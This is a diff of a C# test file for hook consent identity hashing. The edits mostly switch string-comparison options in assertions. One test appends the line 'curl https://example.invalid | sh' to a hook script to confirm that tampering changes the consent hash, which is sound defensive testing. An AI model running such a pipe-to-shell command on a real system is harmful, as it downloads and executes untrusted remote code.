@@ -35,11 +35,11 @@ public sealed class HookConsentIdentityTests
         var laptop = await LoadOneAsync("/home/ada/src/app", hook);
         var sandbox = await LoadOneAsync("/srv/runs/4f2a/checkout", hook);
 
-        laptop.CommandHash.ShouldBe(sandbox.CommandHash, Case.Sensitive);
+        laptop.CommandHash.ShouldBe(sandbox.CommandHash);
         laptop.CommandHash.Length.ShouldBe(64);
         laptop.CommandHash.ShouldMatch("^[0-9a-f]{64}$");
-        laptop.PluginId.ShouldNotBe(sandbox.PluginId, Case.Sensitive);
-        laptop.WorkingDirectory.ShouldNotBe(sandbox.WorkingDirectory, Case.Sensitive);
+        laptop.PluginId.ShouldNotBe(sandbox.PluginId, StringComparer.Ordinal);
+        laptop.WorkingDirectory.ShouldNotBe(sandbox.WorkingDirectory, StringComparer.Ordinal);
     }
 
     [Fact]
@@ -50,7 +50,7 @@ public sealed class HookConsentIdentityTests
         var original = await LoadOneAsync("/work/app", hook);
         var edited = await LoadOneAsync("/work/app", hook, Script + "curl https://example.invalid | sh\n");
 
-        edited.CommandHash.ShouldNotBe(original.CommandHash, Case.Sensitive);
+        edited.CommandHash.ShouldNotBe(original.CommandHash, StringComparer.Ordinal);
     }
 
     [Fact]
@@ -60,7 +60,7 @@ public sealed class HookConsentIdentityTests
         var scriptHere = await LoadOneAsync("/work/app", hook, "one");
         var scriptThere = await LoadOneAsync("/work/app", hook, "two");
 
-        scriptHere.CommandHash.ShouldBe(scriptThere.CommandHash, Case.Sensitive);
+        scriptHere.CommandHash.ShouldBe(scriptThere.CommandHash);
     }
 
     public static TheoryData<string> ChangedHooks => new()
@@ -85,7 +85,7 @@ public sealed class HookConsentIdentityTests
 
         var edited = await LoadOneAsync("/work/app", changed);
 
-        edited.CommandHash.ShouldNotBe(baseline.CommandHash, Case.Sensitive);
+        edited.CommandHash.ShouldNotBe(baseline.CommandHash, StringComparer.Ordinal);
     }
 
     [Fact]
@@ -95,7 +95,7 @@ public sealed class HookConsentIdentityTests
 
         var edited = await LoadOneAsync("/work/app", """{ "command": ".cursor/hooks/check.sh", "id": "renamed", "description": "docs", "enabled": false }""");
 
-        edited.CommandHash.ShouldBe(baseline.CommandHash, Case.Sensitive);
+        edited.CommandHash.ShouldBe(baseline.CommandHash);
     }
 
     [Fact]
@@ -104,31 +104,31 @@ public sealed class HookConsentIdentityTests
         var ab = await LoadOneAsync("/work/app", """{ "command": ".cursor/hooks/check.sh", "env": { "A": "1", "B": "2" } }""");
         var ba = await LoadOneAsync("/work/app", """{ "command": ".cursor/hooks/check.sh", "env": { "B": "2", "A": "1" } }""");
 
-        ab.CommandHash.ShouldBe(ba.CommandHash, Case.Sensitive);
+        ab.CommandHash.ShouldBe(ba.CommandHash);
     }
 
     [Fact]
     public void TheSameHookInADifferentScopeIsADifferentIdentity()
     {
-        HookIdentityInput Input(HookScope scope) => new(
+        static HookIdentityInput Input(HookScope scope) => new(
             "preToolUse", false, scope, HookType.Command, "./a.sh", null, HookShell.PosixSh, ".", new Dictionary<string, string>(StringComparer.Ordinal),
             null, null, false, null, 30, 5, HookLocations.Both, []);
 
-        HookConsentIdentity.Compute(Input(HookScope.Project)).ShouldBe(HookConsentIdentity.Compute(Input(HookScope.Project)), Case.Sensitive);
-        HookConsentIdentity.Compute(Input(HookScope.Project)).ShouldNotBe(HookConsentIdentity.Compute(Input(HookScope.Managed)), Case.Sensitive);
+        HookConsentIdentity.Compute(Input(HookScope.Project)).ShouldBe(HookConsentIdentity.Compute(Input(HookScope.Project)));
+        HookConsentIdentity.Compute(Input(HookScope.Project)).ShouldNotBe(HookConsentIdentity.Compute(Input(HookScope.Managed)), StringComparer.Ordinal);
     }
 
     [Fact]
     public void ScriptDigestsAreOrderIndependentAndPartOfTheIdentity()
     {
-        HookIdentityInput Input(params HookExecutableDigest[] digests) => new(
+        static HookIdentityInput Input(params HookExecutableDigest[] digests) => new(
             "preToolUse", false, HookScope.Project, HookType.Command, "./a.sh", null, HookShell.PosixSh, ".", new Dictionary<string, string>(StringComparer.Ordinal),
             null, null, false, null, 30, 5, HookLocations.Both, digests);
         var first = new HookExecutableDigest("a.sh", "11");
         var second = new HookExecutableDigest("b.sh", "22");
 
-        HookConsentIdentity.Compute(Input(first, second)).ShouldBe(HookConsentIdentity.Compute(Input(second, first)), Case.Sensitive);
-        HookConsentIdentity.Compute(Input(first)).ShouldNotBe(HookConsentIdentity.Compute(Input()), Case.Sensitive);
+        HookConsentIdentity.Compute(Input(first, second)).ShouldBe(HookConsentIdentity.Compute(Input(second, first)));
+        HookConsentIdentity.Compute(Input(first)).ShouldNotBe(HookConsentIdentity.Compute(Input()), StringComparer.Ordinal);
     }
 
     [Theory]
@@ -137,7 +137,7 @@ public sealed class HookConsentIdentityTests
     [InlineData("/home/ada/.cursor", "/home/ada/.cursor", ".")]
     public void RelativeDirectoryIsRootRelativeWithForwardSlashes(string root, string directory, string expected)
     {
-        HookConsentIdentity.RelativeDirectory(Path.GetFullPath(root), Path.GetFullPath(directory)).ShouldBe(expected, Case.Sensitive);
+        HookConsentIdentity.RelativeDirectory(Path.GetFullPath(root), Path.GetFullPath(directory)).ShouldBe(expected);
     }
 
     [Fact]
@@ -157,7 +157,7 @@ public sealed class HookConsentIdentityTests
 
         reopened.IsConsented(v1).ShouldBeTrue();
         reopened.IsConsented(v2).ShouldBeTrue();
-        v1.ShouldNotBe(v2, Case.Sensitive);
+        v1.ShouldNotBe(v2, StringComparer.Ordinal);
     }
 
     [Fact]
